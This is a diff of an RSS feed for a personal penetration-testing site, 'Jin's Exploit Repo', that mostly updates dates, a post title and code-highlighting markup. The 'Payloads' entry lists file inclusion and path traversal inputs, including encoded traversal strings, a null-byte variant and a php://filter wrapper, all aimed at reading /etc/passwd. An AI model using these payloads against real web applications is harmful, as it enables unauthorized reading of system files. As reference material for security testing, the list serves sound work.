@@ -6,10 +6,10 @@
         <description>Recent content in Resources on Jin&#39;s Exploit Repo</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 06 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://sudo-echo-jin.github.io/categories/resources/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 19 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://sudo-echo-jin.github.io/categories/resources/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Payloads</title>
         <link>https://sudo-echo-jin.github.io/p/file-inclusion/</link>
-        <pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate>
+        <pubDate>Mon, 19 Dec 2022 00:00:00 +0000</pubDate>
         
         <guid>https://sudo-echo-jin.github.io/p/file-inclusion/</guid>
         <description>&lt;img src="https://sudo-echo-jin.github.io/p/file-inclusion/payload.jpg" alt="Featured image of post Payloads" /&gt;&lt;p&gt;Cover photo by &lt;a class=&#34;link&#34; href=&#34;https://unsplash.com/@switch_dtp_fotografie&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -60,23 +60,23 @@
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/etc/passwd
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/etc/passwd
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;../../../../../../etc/passwd
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;../../../../../../etc/passwd%00 # works on php version &amp;lt;= 5.3.4
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd # url encode
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd # url encode twice
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php://filter/convert.base64-encode/resource=PAYLOAD # wrapper
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;../../../../../../etc/passwd%00 &lt;span class=&#34;c1&#34;&gt;# works on php version &amp;lt;= 5.3.4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd &lt;span class=&#34;c1&#34;&gt;# url encode&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd &lt;span class=&#34;c1&#34;&gt;# url encode twice&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php://filter/convert.base64-encode/resource&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;PAYLOAD &lt;span class=&#34;c1&#34;&gt;# wrapper&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;</description>
         </item>
         <item>
-        <title>Windows Basic</title>
+        <title>Windows Fundamental</title>
         <link>https://sudo-echo-jin.github.io/p/windows-resource/</link>
-        <pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate>
+        <pubDate>Mon, 19 Dec 2022 00:00:00 +0000</pubDate>
         
         <guid>https://sudo-echo-jin.github.io/p/windows-resource/</guid>
-        <description>&lt;img src="https://sudo-echo-jin.github.io/p/windows-resource/window.jpg" alt="Featured image of post Windows Basic" /&gt;&lt;p&gt;Cover photo by &lt;a class=&#34;link&#34; href=&#34;https://unsplash.com/@slrncl&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <description>&lt;img src="https://sudo-echo-jin.github.io/p/windows-resource/window.jpg" alt="Featured image of post Windows Fundamental" /&gt;&lt;p&gt;Cover photo by &lt;a class=&#34;link&#34; href=&#34;https://unsplash.com/@slrncl&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://unsplash.com/@slrncl&lt;/a&gt;&lt;/p&gt;
 &lt;h1 id=&#34;powershell-commands&#34;&gt;Powershell Commands&lt;/h1&gt;
 &lt;h3 id=&#34;services&#34;&gt;Services&lt;/h3&gt;
